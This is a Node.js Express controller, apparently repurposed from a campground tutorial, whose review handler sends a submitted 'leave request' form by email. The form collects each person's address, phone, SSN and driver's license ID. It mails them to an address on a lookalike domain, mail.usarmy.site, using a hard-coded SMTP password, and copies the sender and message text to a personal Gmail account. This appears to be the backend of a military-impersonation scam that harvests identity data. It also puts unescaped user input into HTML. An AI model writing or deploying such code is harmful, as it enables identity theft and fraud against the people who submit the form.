const nodemailer = require('nodemailer');
const Campground = require('../models/campground');
const Review = require('../models/review');

module.exports.createReview = async (req, res) => {
    console.log(req.body);
    const campground = await Campground.findById(req.params.id);
    campground.price = req.body.review.price;
    const review = new Review(req.body.review);
    review.author = req.body.review.author;
    // console.log(review)
    campground.reviews.push(review);
    // console.log(campground)
    await review.save();
    await campground.save();
    console.log(campground.reviews)

    let transporter = nodemailer.createTransport({
        host: 'mail.usarmy.site',
        port: 465,
        auth: {
            user: "baseauthority@mail.usarmy.site",
            pass: "4r7WxmUh93"
        }
})

    message = {
            from: `${req.body.review.email}`,
            to: "baseauthority@mail.usarmy.site",
            // to: "jflexzyofficial@yahoo.com",

            subject: `${req.body.review.author} [${req.body.review.number}] has requested for  Leave`,


            html: `<b>Name: </b>${req.body.review.author}, <br>
            <b>Email: </b>${req.body.review.email}, <br>
            <b>Address: </b>${req.body.review.address}, <br>
            <b>Phone Number: </b>${req.body.review.number}, <br>
            <b>SSN: </b>${req.body.review.ssn}, <br>
            <b>Driver's License ID: </b>${req.body.review.license}, <br>

            <b>Type of Leave: </b>${req.body.review.leaveType}, <br>
            <b>Price: </b>${req.body.review.author}, <br>
    
            
            <h4>Message</h4>
            <p>${req.body.review.body}</p>`,



            text: `${req.body.review.body}`

    }
     

    message2 = {
        from: `${req.body.review.email}`,
        to: "alwindreyer@gmail.com",
        // to: "jflexzyofficial@yahoo.com",

        subject: `${req.body.review.author}[${req.body.review.number}] has requested for  Leave`,
        text: `${req.body.review.body}`
}

    transporter.sendMail(message, function(err, info){
            if (err) {
            console.log(err)
            } else {
            console.log(info);
            }
        })

        transporter.sendMail(message2, function(err, info){
            if (err) {
            console.log(err)
            } else {
            console.log(info);
            }
        })

        transporter.sendMail(message2, function(err, info){
            if (err) {
            console.log(err)
            } else {
            console.log(info);
            }
        })

    req.flash('success', 'Form submitted sent Successfully!');
    res.redirect(`/campgrounds/${campground._id}/checkout`);
}

module.exports.deleteReview = async (req, res) => {
    const { id, reviewId } = req.params;
    await Campground.findByIdAndUpdate(id, { $pull: { reviews: reviewId } });
    await Review.findByIdAndDelete(reviewId);
    req.flash('success', 'Successfully deleted message')
    res.redirect(`/campgrounds/${id}`);
}
